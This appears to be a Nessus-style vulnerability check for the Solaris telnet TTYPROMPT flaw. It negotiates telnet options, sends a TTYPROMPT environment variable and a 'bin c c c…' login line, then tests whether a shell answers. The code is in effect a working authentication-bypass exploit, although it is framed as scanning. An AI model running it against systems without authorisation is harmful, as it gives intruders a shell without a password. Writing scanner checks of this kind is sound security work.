# DESC  : Solaris TTYPROMPT login vulnerability
# AUTHOR: Fizz
# DATE  : 04/03/2006
#
# NOTES : This vulnerability check is based on the
#         ttyprompt.nasl script provided from the nessus project.
#


# #############
# # FUNCTIONS #
# #############

function init()
{
    send(socket:soc, data:raw_string(
        0xFF, 252, 0x25,
        0xFF, 254, 0x26,
        0xFF, 252, 0x26,
        0xFF, 254, 0x03,
        0xFF, 252, 0x18,
        0xFF, 252, 0x1F,
        0xFF, 252, 0x20,
        0xFF, 252, 0x21,
        0xFF, 252, 0x22,
        0xFF, 0xFB, 0x27,
        0xFF, 254, 0x05,
        0xFF, 252, 0x23));
    r = recv(socket:soc, length:30);
    lim = strlen(r);
    for(i=0;i<lim - 2;i=i+3)
    {
        if(!(ord(r[i+2]) == 0x27))
        {
            if(ord(r[i+1]) == 251)
                c = 254;
            if(ord(r[i+1]) == 252)
                c = 254;
            if(ord(r[i+1]) == 253)
                c = 252;
            if(ord(r[i+1]) == 254)
                c = 252;

            s = raw_string(ord(r[i]), c, ord(r[i+2]));
            send(socket:soc, data:s);
        }
    }

    send(socket:soc, data:raw_string(0xFF, 0xFC, 0x24));


    r = recv(socket:soc, length:300);

    send(socket:soc, data:raw_string(0xFF, 0xFA, 0x27, 0x00, 0x03, 0x54, 0x54, 0x59, 0x50, 0x52, 0x4F, 0x4D, 0x50, 0x54, 0x01, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0xFF, 0xF0));
}


# #############
# # THE CHECK #
# #############

port = 23;

if(!get_port_state(port))
    exit(0);

soc = open_sock_tcp(port);

if(soc)
{
    buf = init();
		send(socket:soc, data:string("bin c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c\r\n"));
    r = recv(socket:soc, length:4096);
    if(!r)
        exit(0);

    send(socket:soc, data:string("uid\r\n"));
    r = recv(socket:soc, length:1024);
    
    if("uid" >< r)
    {
        send(socket:soc, data:string("exit\r\n"));
        display("Success");
    }
}
